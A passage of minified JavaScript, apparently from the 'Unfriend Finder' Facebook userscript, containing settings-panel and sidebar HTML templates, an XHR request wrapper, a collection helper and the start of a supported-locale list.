margin-left: 30px; width: 460px;">                 <tbody>                     <tr>                         <th id="bindTourSettings" class="no_border"></th>                         <th class="even_column no_border">&nbsp;</th>                     </tr>                     <tr>                         <th class="iconPlace">                             <strong style="position:relative;">'+LANG.awaiting+'                                 <span style="background-position:-16px 0;                                      background-repeat:no-repeat;                                      display:block; height:20px; left:-22px;                                      position:absolute; top:-1px; width:20px; height:16px !important;                                     background-image:url('+Params.icons.awaitings+');" />                             </strong>                         </th>                         <th class="even_column logo">                             <img src="'+Params.images.blank+'" style="background-position:0 -798px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt="Display"/>                         </th>                     </tr>                     <tr class="settings row">                         <td class="action_text">'+LANG.confirmed+'</td>                         <td class="even_column">                             <input type="checkbox" value="display_confirmed_requests" name="Params.settings.accepted" id="accepted"'+(Params.settings.accepted?' checked="checked"':"")+'" title="'+LANG.confirmed+'" class="inputcheckbox "/>                         </td>                     </tr>                     <tr class="settings row">                         <td class="action_text">'+LANG.declined+'</td>                         <td class="even_column">                             <input type="checkbox" value="display_canceled_requests" name="Params.settings.ignored" id="ignored"'+(Params.settings.ignored?' checked="checked"':"")+'" title="'+LANG.declined+'" class="inputcheckbox "/>                         </td>                     </tr>                     <tr class="settings row">                         <td class="action_text">'+LANG.dissociateLists+'</td>                         <td class="even_column">                             <input type="checkbox" value="settings_dissociateLists" name="Params.settings.dissociateLists" id="dissociateLists"'+(Params.settings.dissociateLists?' checked="checked"':"")+'" title="'+LANG.dissociateLists+'" class="inputcheckbox "/>                         </td>                     </tr>                     <tr class="settings row">                         <td class="action_text">'+LANG.newManagementLists+' <a href="#" id="newManagementLists_help" onclick="return false;">[?]</a></td>                         <td class="even_column">                             <input type="checkbox" value="settings_newManagementLists" name="Params.settings.newManagementLists" id="newManagementLists"'+(Params.settings.newManagementLists?' checked="checked"':"")+'" title="'+LANG.newManagementLists+'" class="inputcheckbox "/>                         </td>                     </tr>                 </tbody>            </table>            <table cellspacing="0" style="margin-top: 10px; margin-left: 30px; width: 460px;">                <tbody>                    <tr>                        <th class="no_border"></th>                        <th class="even_column no_border">&nbsp;</th>                    </tr>                    <tr>                        <th class="iconPlace">                            <strong style="position:relative;">'+LANG.notifications+"                                <span style=\"background-position:-801px -66px;                                      background-repeat:no-repeat;                                      display:block; height:20px; left:-22px;                                      position:absolute; top:-1px; width:17px; height:17px !important;                                     background-image:url('"+Params.links.rsrc+'/z136G/hash/3ay18ob4.png\');" />                            </strong>                        </th>                        <th class="even_column logo">                            <img src="'+Params.images.blank+'" style="background-position:0 -1182px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt="Display"/>                        </th>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.onunfriend+'</td>                        <td class="even_column">                            <input type="checkbox" value="notif_unfriend" name="Params.settings.notifUnfriend" id="notifUnfriend"'+(Params.settings.notifUnfriend?' checked="checked"':"")+'" title="'+LANG.onunfriend+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.oncanceled+'</td>                        <td class="even_column">                            <input type="checkbox" value="notif_ignoredrequest" name="Params.settings.notifIgnored" id="notifIgnored"'+(Params.settings.notifIgnored?' checked="checked"':"")+'" title="'+LANG.oncanceled+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row" style="display:table-row; '+(Params.env.isChrome?"":"color:gray")+'">                        <td class="action_text">'+LANG.webkitNotifications+' (<a href="#" style="'+(Params.env.isChrome?"":"color:gray")+'" id="test_webkitNotifications">test</a>)</td>                        <td class="even_column">                            <input '+(Params.env.isChrome?"":'disabled="disabled"')+' type="checkbox" value="webkit_notifications" name="Params.settings.webkitNotifications" id="webkitNotifications"'+(Params.settings.webkitNotifications?' checked="checked"':"")+'" title="'+LANG.webkitNotifications+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.onlyShowNewUnfriends+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_onlyShowNewUnfriends" name="Params.settings.onlyShowNewUnfriends" id="onlyShowNewUnfriends"'+(Params.settings.onlyShowNewUnfriends?' checked="checked"':"")+'" title="'+LANG.onlyShowNewUnfriends+'" class="inputcheckbox "/>                        </td>                    </tr>                </tbody>            </table>            <table cellspacing="0" style="margin-top: 10px; margin-left: 30px; width: 460px;">                <tbody>                    <tr>                        <th class="no_border"></th>                        <th class="even_column no_border">&nbsp;</th>                    </tr>                    <tr>                    <tr>                        <th class="iconPlace">                            <strong style="position:relative;">Paging                                <span style="background-repeat:no-repeat;                                      display:block; height:20px; left:-22px;                                      position:absolute; top:-1px; width:17px; height:17px !important;                                     background-image:url(\''+Params.links.rsrc+'/zL/r/7jxYm2BD_ax.png\');" />                            </strong>                        </th>                        <th class="even_column logo">                            <img src="'+Params.images.blank+'" style="background-position:0 -1182px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt="Display"/>                        </th>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.enablepaging+' <a href="#" id="paging_help" onclick="return false;">[?]</a></td>                        <td class="even_column">                            <input type="checkbox" id="paging"'+(Params.settings.paging>0?' checked="checked"':"")+'" title="'+LANG.enablepaging+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row" id="trPagingCount" style="display:'+(Params.settings.paging==0?CSS3.DISPLAY.none:"table-row")+';">                        <td class="action_text">'+LANG.pagecount+'</td>                        <td class="even_column">                            <select id="pagingCount" style="font-size: 10px; margin-left: 23px; border: medium none; background: none repeat scroll 0% 0% rgb(248, 248, 248); outline: medium none;">                                <option value="5"'+(Params.settings.paging==5?' selected="selected"':"")+'>5</option>                                <option value="10"'+(Params.settings.paging==10?' selected="selected"':"")+'>10</option>                                <option value="20"'+(Params.settings.paging==20?' selected="selected"':"")+'>20</option>                                <option value="30"'+(Params.settings.paging==30?' selected="selected"':"")+'>30</option>                                <option value="40"'+(Params.settings.paging==40?' selected="selected"':"")+'>40</option>                                <option value="50"'+(Params.settings.paging==50?' selected="selected"':"")+'>50</option>                                <option value="100"'+(Params.settings.paging==100?' selected="selected"':"")+'>100</option>                                <option value="200"'+(Params.settings.paging==200?' selected="selected"':"")+'>200</option>                            </select>                        </td>                    </tr>                </tbody>            </table>            <table cellspacing="0" style="margin-top: 10px; margin-left: 30px; width: 460px;">                 <tbody>                    <tr>                        <th class="no_border"></th>                        <th class="even_column no_border">&nbsp;</th>                    </tr>                    <tr>                        <th class="iconPlace">                            <strong style="position:relative;">'+LANG.othersettings+"                                <span style=\"background-position:-606px -66px;                                     background-repeat:no-repeat;                                     display:block; height:20px; left:-22px;                                     position:absolute; top:-1px; width:16px; height:16px !important;                                    background-image:url('"+Params.links.rsrc+'/z136G/hash/3ay18ob4.png\');" />                            </strong>                        </th>                        <th class="even_column logo">                            <img src="'+Params.images.blank+'" style="background-position:0 -1182px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt="Display"/>                        </th>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.icons+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_show_icons" name="Params.settings.icons" id="icons"'+(Params.settings.icons?' checked="checked"':"")+'" title="'+LANG.icons+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.uids+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_show_uid" name="Params.settings.uid" id="uid"'+(Params.settings.uid?' checked="checked"':"")+'" title="'+LANG.uids+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.profilepics+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_update_profile_pic" name="Params.settings.updatePicture" id="updatePicture"'+(Params.settings.updatePicture?' checked="checked"':"")+'" title="'+LANG.profilepics+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.showTime+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_showTime" name="Params.settings.showTime" id="showTime"'+(Params.settings.showTime?' checked="checked"':"")+'" title="'+LANG.showTime+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.hidemenubar+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_show_unfriend_link" name="Params.settings.hideInMenubar" id="hideInMenubar"'+(Params.settings.hideInMenubar?' checked="checked"':"")+'" title="'+LANG.hidemenubar+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.hideNub+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_hide_nub" name="Params.settings.hideNub" id="hideNub"'+(Params.settings.hideNub?' checked="checked"':"")+'" title="'+LANG.hideNub+'" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">Debug</td>                        <td class="even_column">                            <input type="checkbox" value="settings_debug" name="Params.settings.debug" id="debug"'+(Params.settings.debug?' checked="checked"':"")+'" title="Debug" class="inputcheckbox "/>                        </td>                    </tr>                    <tr class="settings row">                        <td class="action_text">'+LANG.statistics+'</td>                        <td class="even_column">                            <input type="checkbox" value="settings_debug" name="Params.settings.statistics" id="statistics"'+(Params.settings.statistics?' checked="checked"':"")+'" title="'+LANG.statistics+'" class="inputcheckbox "/>                        </td>                    </tr>                </tbody>            </table>        </div>    </div>    <div class="closed">        <div class="uiHeader uiHeaderBottomBorder uiHeaderGroup mtl">            <div class="clearfix uiHeaderTop">                <div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.lang+'</h3></div>                <div class="rfloat"><h5 style="position:relative; top:3px;"><a onclick="div = this.parentNode.parentNode.parentNode.parentNode.parentNode; div.className = (div.className == \'visible\'?\'closed\':\'visible\');"><span class="changeLink">'+LANG.change+'</span><span class="hideLink">'+LANG.hide+'</span></a></h5></div>            </div>        </div>        <div class="desc">            <div class="lfloat">'+LANG.currentlang+'</div>            <div class="rfloat">'+LANG.langname+'</div>        </div>        <div class="hiddenContent" id="language_form">            <p>'+LANG.clang+'</p>            <table cellspacing="0" style="margin-top:7px; margin-left:30px; width:460px;">                <tbody id=\'langs_tbody\'>                   <tr>                        <th class="no_border"></th>                        <th class="even_column no_border"></th>                    </tr>                    <tr>                       <th class="iconPlace">                            <strong style="position:relative;">'+LANG.lang+"                                <span style=\"background-position:0 -1262px;                                     background-repeat:no-repeat;                                     display:block; height:20px; left:-22px;                                     position:absolute; top:-1px; width:17px; height:16px !important;                                    background-image:url('"+Params.images.blank+'\');" class="spritemap_icons spritemap_icons_fix" />                           </strong>                        </th>                        <th style="color:#777777; font-size:9px; border-bottom:1px solid #C7CFE0; margin:0; padding:3px; text-align:center;" class="even_column no_border">                           '+LANG.use+"                        </th>                    </tr>                    "+LANG.genSettings()+'                </tbody>            </table>        </div>    </div>    <div class="closed">        <div class="uiHeader uiHeaderBottomBorder uiHeaderGroup mtl">            <div class="clearfix uiHeaderTop">                <div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.reset_+'</h3></div>                <div class="rfloat"><h5 style="position:relative; top:3px;"><a onclick="div = this.parentNode.parentNode.parentNode.parentNode.parentNode; div.className = (div.className == \'visible\'?\'closed\':\'visible\');"><span class="changeLink">'+LANG.reset+'</span><span class="hideLink">'+LANG.hide+'</span></a></h5></div>            </div>        </div>        <div class="hiddenContent">            <div class="UIMessageBox explanation_note" style="margin:15px;">                <h2 class="main_message">'+LANG.rvoid+'</h2>                <p class="sub_message">                    <br />                    <a href="#" onclick="return false;" id="selectAll">'+LANG.selectall+'</a> - <a href="#" onclick="return false;" id="selectNone">'+LANG.selectnone+'</a>                    <br />                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_unfriends" /> Unfriends list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_friends" /> Comparative Friends list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_toNotify" /> Notified unfriends list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_awaitingsIgnored" /> Comparative Awaiting list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_keepAwaitingList" /> Accepted & Ignored list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_reappeared" /> Reappeared list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_deactivated" /> Deactivated list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_wasUnfriend" /> "was in your friendlist" list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_hasIgnored" /> "ignored one of your friend request" list                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_messages" /> Informations Messages                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_helps" /> Contextual helps                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_settings" /> Settings                    <br /><input bindpoint="reset" type="checkbox" checked="checked" id="reset_language" /> Language                    <br />                    <br />                    <br />                    <span id="resetForm"><span class="uiButton uiButtonLarge uiButtonConfirm"><input id="resetButton" class="UIButton_Text" type="button" value="'+LANG.creset+'" /></span></span>                </p>            </div>        </div>    </div>    <div class="closed">        <div class="uiHeader uiHeaderBottomBorder uiHeaderGroup mtl">            <div class="clearfix uiHeaderTop">                <div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.exportData+"/"+LANG.importData+'</h3></div>                <div class="rfloat"><h5 style="position:relative; top:3px;"><a onclick="div = this.parentNode.parentNode.parentNode.parentNode.parentNode; div.className = (div.className == \'visible\'?\'closed\':\'visible\');"><span class="changeLink">'+LANG.proceed+'</span><span class="hideLink">'+LANG.hide+'</span></a></h5></div>            </div>        </div>        <div class="hiddenContent">            <div class="UIMessageBox explanation_note" style="margin:15px;">                '+LANG.back1+"<br /><br />"+LANG.back2+'                <br /><br />                <span id="exportForm"><span class="uiButton uiButtonLarge uiButtonConfirm"><input id="exportButton" class="UIButton_Text" type="button" value="'+LANG.text_export+'" /></span></span>                <span id="importForm"><span class="uiButton uiButtonLarge uiButtonConfirm"><input id="importButton" class="UIButton_Text" type="button" value="'+LANG.text_import+'" /></span></span>            </div>        </div>    </div>    <div class="closed" style="display:none;">        <div class="uiHeader uiHeaderBottomBorder uiHeaderGroup mtl">            <div class="clearfix uiHeaderTop">                <div class="lfloat"><h3 class="uiHeaderTitle">External Backup</h3></div>                <div class="rfloat"><h5 style="position:relative; top:3px;"><a onclick="div = this.parentNode.parentNode.parentNode.parentNode.parentNode; div.className = (div.className == \'visible\'?\'closed\':\'visible\');"><span class="changeLink">'+LANG.proceed+'</span><span class="hideLink">'+LANG.hide+'</span></a></h5></div>            </div>        </div>        <div class="hiddenContent">            <div class="UIMessageBox explanation_note" style="margin:15px;">                <strong>Credentials :</strong>                <br />                <label style="margin-top:10px; width:130px; display:inline-block;" for="external_connect_userid">UserID :</label><input style="width:440px; display:inline-block;" class="inputtext" disabled="disabled" id="external_connect_userid" name="id" autocomplete="off" type="text" value="'+core.user_id+'">                <br />                <label style="margin-top:10px; width:130px; display:inline-block;" for="external_connect_password">Password :</label><input style="width:440px; display:inline-block;" class="inputtext" id="external_connect_password" name="password" value="" autocomplete="off" type="text" style="margin-bottom:5px;" />                <br /><br /><strong>Actions :</strong>                <br /><span class="uiButton uiButtonMedium uiButtonConfirm" style="display:inline-block; margin-left:4px; margin-top:10px; width:65px; height:22px;" id="external_login"><input type="button" value="Login" class="UIButton_Text" id="external_login_button" style="width:100%;"><img id="external_login_indicator" src="'+Params.images.smallIndicator+'" style="display:none; height:11px; margin:auto; padding-top:5px;" /></span>                <span class="uiButton uiButtonMedium uiButtonConfirm" style="display:inline-block; margin-top:10px; width:65px; height:22px;" id="external_backup"><input type="button" value="Backup" class="UIButton_Text" id="external_backup_button" style="width:100%;"><img id="external_backup_indicator" src="'+Params.images.smallIndicator+'" style="display:none; height:11px; margin:auto; padding-top:5px;" /></span>                <span class="uiButton uiButtonMedium uiButtonConfirm" style="display:inline-block; margin-top:10px; width:65px; height:22px;" id="external_sync"><input type="button" value="Sync" class="UIButton_Text" id="external_sync_button" style="width:100%;"><img id="external_sync_indicator" src="'+Params.images.smallIndicator+'" style="display:none; height:11px; margin:auto; padding-top:5px;" /></span>                <span class="uiButton uiButtonMedium uiButtonConfirm" style="display:inline-block; margin-top:10px; width:65px; height:22px;" id="external_logout"><input type="button" value="Logout" class="UIButton_Text" id="external_logout_button" style="width:100%;"><img id="external_logout_indicator" src="'+Params.images.smallIndicator+'" style="display:none; height:11px; margin:auto; padding-top:5px;" /></span>                <br /><span id="external_lastlogin" style="padding-top:5px; display:block;">Last sync: </span>            </div>        </div>    </div></div>'
},UnfriendFinderBox:function(){return'<div class="UIHomeBox UITitledBox" style="margin-bottom: 255px; margin-top: 5px;">   <div class="uiHeader uiHeaderTopAndBottomBorder mbs uiSideHeader">      <div class="clearfix uiHeaderTop">          <div class="uiTextSubtitle uiHeaderActions rfloat">              <a id="settingsLink" href="#/?sk=ufs">'+LANG.settings+'</a> · <a href="http://www.unfriendfinder.'+(Params.lang=="fr"?"fr":"com")+'/help" onclick="window.open(this.href); return false;">'+LANG.help+'</a>          </div>          <div>              <h4 class="uiHeaderTitle">'+Params._0x4d22+' <a id="changelogLink" style="text-decoration:underline;" onclick="return false;" href="#">v'+Params.version+(Params.dev?"."+Params.built:"")+'</a></h4>          </div>      </div>   </div>   <div class="UITitledBox_Content" style="margin-bottom:10px;">      <div>          <div class="phs">              <strong style="font-size:10px; font-family:Tahoma;">                 <a id="becomeFan_title" href="'+Params.links.page+'">Fanpage</a>                 <strong id="joinGroup_dot" style="display:inline-block;">&nbsp;·&nbsp;</strong>                 <a style="display:inline-block;" id="joinGroup_title" href="'+Params.links.group+'">'+LANG.joinGroup.replace(" ","&nbsp;")+'</a>                 <strong id="joinTwitter_dot">&nbsp;·&nbsp;</strong>                 <a onclick="window.open(this.href); return false;" id="follow_title" href="'+Params.links.twitter+'">Twitter</a>                 <strong id="forum_dot">&nbsp;·&nbsp;</strong>                 <a onclick="window.open(this.href); return false;" id="forum_title" href="'+Params.links.forum+'">Forum</a></strong>          </div>          <div class="UIImageBlock clearfix" style="margin-top:15px; margin-bottom:30px; font-size: 10px;">              <a onclick="return false;" style="display:none;" id="ufSubscribeIMG" class="UIImageBlock_Image UIImageBlock_SMALL_Image ad_image" href="#"><img src="'+Params.links.rsrc+'/v1/yc/r/JxeuGbpy7rN.png" class="img"></a>              <a onclick="window.open(this.href); return false;" style="display:none;" id="ufPageIMG" class="UIImageBlock_Image UIImageBlock_SMALL_Image ad_image" href="'+Params.links.page+'"><img src="https://www.unfriendfinder.com/images/becomeFan.png" class="img"></a>              <a onclick="window.open(this.href); return false;" style="display:none;" id="ufGroupIMG" class="UIImageBlock_Image UIImageBlock_SMALL_Image ad_image" href="'+Params.links.group+'"><img src="https://www.unfriendfinder.com/images/group.png" class="img"></a>              <a onclick="window.open(this.href); return false;" style="display:none;" id="ufForumIMG" class="UIImageBlock_Image UIImageBlock_SMALL_Image ad_image" href="'+Params.links.forum+'"><img src="https://www.unfriendfinder.com/images/forum.png" class="img"></a>              <a onclick="window.open(this.href); return false;" style="display:none;" id="ufTwitterIMG" class="UIImageBlock_Image UIImageBlock_SMALL_Image ad_image" href="'+Params.links.twitter+'"><img src="https://www.unfriendfinder.com/images/twitter.png" class="img"></a>              <a onclick="window.open(this.href); return false;" style="display:none; width: 100%; text-align: center;" id="ufDonateIMG" class="UIImageBlock_Image UIImageBlock_SMALL_Image ad_image" href="'+Params.links.donate+'"><img src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" class="img" style="margin:15px auto;"></a>              <div id="ufDonateText" style="text-align:center; display:none;"><br />Support the script, make a donation !<br /><a onclick="window.open(this.href); return false;" href="'+Params.links.donate+'">Learn More</a></div>              <div id="ufSubscribeText" style="text-align:left; display:none;"><br />Subscribe to the developer\'s public updates to get the latest interesting informations.</div>              <div class="UIImageBlock_Content UIImageBlock_SMALL_Content" id="ufForumText" style="display:none;">                 <a onclick="window.open(this.href); return false;" class="ads_text en_US" href="'+Params.links.forum+'"><b style="font-size:12px;">The forum</b><br />A new way to get in touch, share ideas and start talking! Connect with your Facebook Account</a>                 <a onclick="window.open(this.href); return false;" class="ads_text fr_FR" href="'+Params.links.forum+'"><b style="font-size:12px;">Le forum</b><br />Un nouvel espace pour rester en contact, partager ses idées, et discuter !</a>              </div>              <div class="UIImageBlock_Content UIImageBlock_SMALL_Content" id="ufCommunityText">                 <a onclick="window.open(this.href); return false;" class="ads_text" href="'+Params.links.twitter+'"><span class="en_US">Follow me on <a onclick="window.open(this.href); return false;" href="'+Params.links.twitter+'">twitter</a> to get the latest news about the script.<br />Get stuck in!</span></a>                 <a onclick="window.open(this.href); return false;" class="ads_text" href="'+Params.links.twitter+'"><span class="fr_FR">Suivez moi sur <a onclick="window.open(this.href); return false;" href="'+Params.links.twitter+'">twitter</a> pour être au courant des dernières actualités du script.<br />Rejoingnez&nbsp;la&nbsp;communauté&nbsp;!</span></a>              </div>          </div>          <div style="display:none;" class="uiTextHighlight" id="pagelet_newversion"></div>          <div style="display:none;" class="uiTextHighlight" id="pagelet_language"></div>         '+template.Donate()+'          <br />       </div>   </div>   <div class="uiHeader uiHeaderTopAndBottomBorder mbs uiSideHeader">      <div class="clearfix uiHeaderTop">          <div class="uiTextSubtitle uiHeaderActions rfloat">              <a onclick="window.open(this.href); return false;" href="'+Params.links.twitter+'">Follow</a> - <a href="#" rel="3" onclick="window.reinject(function() { Twitter.moreTweets() }); return false;" id="moreTweet">More</a>          </div>          <div>              <h4 class="uiHeaderTitle">Twitter</h4>          </div>      </div>   </div>   <div id="twitterFlow" ></div>   <img id="tweetIndicator" src="'+Params.images.bigIndicator+'" style="display:none; margin-left: 110px; width: 27px; margin-top: 20px; margin-bottom: 20px;" />   <div id="unfriendFinder_message" class="UITitledBox_Content" style="display: block; padding-top: 7px;">      <div class="emu_ad">          <div class="phs">             <a title="'+LANG.btn_close+'" class="close_message" href="#" id="unfriendFinder_message_close">X</a>             <strong>Information :</strong>          </div>          <div class="UIImageBlock clearfix" style="margin-top:5px;">             <div style="text-align:center; padding:10px;" class="uiTextHighlightSpecial" id="unfriendFinder_message_content"></div>          </div>      </div>   </div></div>'
},Contextual_filter:function(){return'<span class="en_US">Here is implemented some new filters on your Facebook homepage to make accessing Unfriend Finder settings and pending friend requests easier.<br />A counter will be displayed next to the individual tabs on and under "Unfriends" to alert you of new activity.</span><span class="fr_FR">Ici, sur votre page d\'accueil Facebook, se trouvent les nouveaux filtres du script qui vous permettent d\'accéder aux paramètres et aux requêtes en attente plus facilement.<br />Un compteur sera disposé à côté de chaque filtre pour vous alerter de nouvelles activités.</span>'
},noMessages:function(){return'<div style="display: block;" class="home_no_messages clearfix" id="noMessages">    <span style="height: 32px;" class="home_no_messages_icon list_empty"></span>    <div class="home_no_messages_content">        <strong id="noText">'+LANG.nomessages+"</strong>    </div></div>"}};var Style=function Style(){var style=this;style.Build=function(){if(Params.head){style.element=getFromId("unfriend_finder")||new xHTMLElement({element:"style",type:"text/css",media:"all",id:"unfriend_finder",textContent:"/*\nHost static.ak.fbcdn.net\nGenerated by "+Params._0x4d22+"\nVersion : "+Params.version+(core?"\nLocale : "+core.fb_locale:"")+"\nPath : /\n*/\n",parentNode:Params.head}).getElement();
new xHTMLElement({element:"link",type:"text/css",href:Params.links.rsrc+"/z3GOW/hash/1pzpz1dl.css",id:"1pzpz1dl",rel:"stylesheet",parentNode:Params.head})}return style.element};style.Append=function StyleAppend(css){trace(null);style.element.textContent=style.element.textContent+"\n"+css};style.toString=function toString(){return"[object Style]"};style.Build()};var XHR=function XHR(__constructor){var _XHR=this;Extend(_XHR,__constructor);if(!_XHR.url){throw (new (Error)("No URL passed in object"))
}if(!_XHR.method){_XHR.method="GET"}if(!_XHR.onload){_XHR.onload=function(){}}if(!_XHR.onerror){_XHR.onerror=function(){}}if(!_XHR.asynchronous){_XHR.async=true}_XHR.updating=false;_XHR.HTTP_CODES={200:true,201:true,202:true,203:true,204:true,205:true,206:true,207:true,210:true,300:true,301:true,302:true,303:true,304:true,305:true,307:true,310:true,400:false,401:false,402:false,403:false,404:false,405:false,406:false,407:false,408:false,409:false,410:false,411:false,412:false,413:false,414:false,415:false,416:false,417:false,418:false,422:false,423:false,424:false,425:false,426:false,449:false,450:false,500:false,501:false,502:false,503:false,504:false,505:false,507:false,509:false};
_XHR.serialize=function(object){var i,ret="",arr=[];for(i in object){if(object.hasOwnProperty(i)){arr.push(i+"="+escape(object[i]))}}return(arr.join("&"))};_XHR.open=function(){if(_XHR.updating){throw (new (Error)("Current request not fully received. Ajax.cancel() to cancel request."))}_XHR.XMLHttpRequest=null;if(window.XMLHttpRequest){_XHR.XMLHttpRequest=new (XMLHttpRequest)}else{_XHR.XMLHttpRequest=new (ActiveXObject)("Microsoft.XMLHTTP")}if(/facebook\.com/.test(_XHR.url)){if(!/remove_friend/.test(_XHR.url)){if(!/lazy=1/.test(_XHR.url)){_XHR.url+="&lazy=1&token=v7&stale_ok=1&__a=1&time="+core.time()+"&__user="+core.user_id+"&viewer="+core.user_id
}}}if(!_XHR.XMLHttpRequest){throw (new (Error)("Object XMLHttpRequest undefined"))}else{_XHR.XMLHttpRequest.onreadystatechange=function(){if(_XHR.XMLHttpRequest.readyState==4){_XHR.updating=false;if(_XHR.HTTP_CODES[_XHR.XMLHttpRequest.status]){_XHR.defer("load",_XHR.XMLHttpRequest.responseText,_XHR.XMLHttpRequest.status)}else{if(!_XHR.HTTP_CODES[_XHR.XMLHttpRequest.status]){_XHR.defer("error",_XHR.XMLHttpRequest.responseText,_XHR.XMLHttpRequest.status)}else{if(0===parseInt(_XHR.XMLHttpRequest.status,10)){throw new Error("XHR: Can't use Ajax() on Cross-domain ("+_XHR.url+")")
}else{throw (new (Error)("XHR: Unknown error (Status code "+_XHR.XMLHttpRequest.status+")"))}}}_XHR.XMLHttpRequest=null}};_XHR.updating=true;Console.log("Opening "+(_XHR.async?"Async ":"")+"XHR to "+_XHR.url);if(/POST/i.test(_XHR.method)){_XHR.XMLHttpRequest.open("POST",_XHR.url,_XHR.async);_XHR.XMLHttpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");_XHR.XMLHttpRequest.send(_XHR.data)}else{_XHR.XMLHttpRequest.open("GET",_XHR.url,_XHR.async);var header,content;for(header in _XHR.headers){if(_XHR.headers.hasOwnProperty(header)){content=_XHR.headers[header];
_XHR.XMLHttpRequest.setRequestHeader(header,content)}}_XHR.XMLHttpRequest.send(null)}}};_XHR.defer=function(state,response,status){setTimeout(function(){if(state=="load"){_XHR.onload(response,status)}else{if(state=="error"){_XHR.onerror(response,status)}}},1)};_XHR.open();return{cancel:function cancel(){if(_XHR.updating){XMLHttpRequest.abort();XMLHttpRequest=null;_XHR.updating=false}},url:_XHR.url,toString:function toString(){return"[Ajax Request]"}}};var CollectionList=function CollectionList(object){if(object===undefined){object=({})
}this.Items=object;this.exceptions=({});this.exception=function(action,ex){switch(action){case"Add":this.exceptions[ex]=true;break;case"Remove":delete this.exceptions[ex]}};this.Clear=function(){this.Items=({});return true};this.Count=function(){var j=0,i;for(i in this.Items){if(this.Items.hasOwnProperty(i)){if(typeof this.Items[i]!=undefined){++j}}}return j};this.Add=function(key,value){key=parseInt(key,10);if(this.exceptions[key]){return false}if(this.Items[key]){return false}if(this.Items[key]==false){return false
}else{this.Items[key]=value;return true}};this.Set=function(key,value){key=parseInt(key,10);if(this.exceptions[key]){return false}if(this.Items[key]){this.Items[key]=value;return true}else{return false}};this.Remove=function(key){key=parseInt(key,10);if(this.exceptions[key]){return false}if(this.Items[key]){delete this.Items[key];return true}else{return false}};this.Key=function(key,value){key=parseInt(key,10);if(this.exceptions[key]){return false}if(value){return this.Set(key,value)}else{if(!key){return this.Items
}else{return this.Items[key]}}};this.Item=function(index){var i=0,k;for(k in this.Items){if(this.Items.hasOwnProperty(k)){i++;if(i==index){return this.Items[k]}}}return false};this.Exists=function(key){key=parseInt(key,10);if(this.exceptions[key]){return false}if(this.Items[key]===undefined){return false}else{return true}};CollectionList.prototype.valueOf=function(){return this.Items};CollectionList.prototype.toString=function toString(){return stringify(this.Items)}};var Lang=function Lang(language){var lang=this,data;
lang.language=language||"en_US",lang.list={en_US:true,en_GB:true,fr_FR:true,fr_CA:true,it_IT:true,es_LA:true,es_ES:true,es_MX:true,ca_ES:true,eu_ES:true,hr_HR:true,el_GR:true,nl_NL:true,de_DE:true,tr_TR:true,pl_PL:true,da_DK:true,fi_FI:true,sv_SE:true,nn_NO:true,nb_NO:true,pt_BR:true,pt_PT:true,ru_RU:true,sk_SK:true,sl_SI:true,sr_RS:true,bg_BG:true,cs_CZ:true,hu_HU:true,ro_RO:true,en_UD:true,en_PI:true,fb_LT:true,la_VA:true,bs_BA:true,lt_LT:true,sq_AL:true,id_ID:true,ms_MY:true,he_IL:true,ar_AR:true,zh_CN:true,zh_TW:true,zh_HK:true,ja_JP:true,ko_KR:true,tl_PH:true,th_TH:true,vi_VN:true,az_AZ:true,eo_EO:true,gl_ES:true,is_IS:true,ku_TR:true,lv_LV:true,ka_GE:true,mk_MK:true,uk_UA:true,hy_AM:true,fa_IR:true,ne_NP:true,bn_IN:true,ta_IN:true,mr_IN:true};
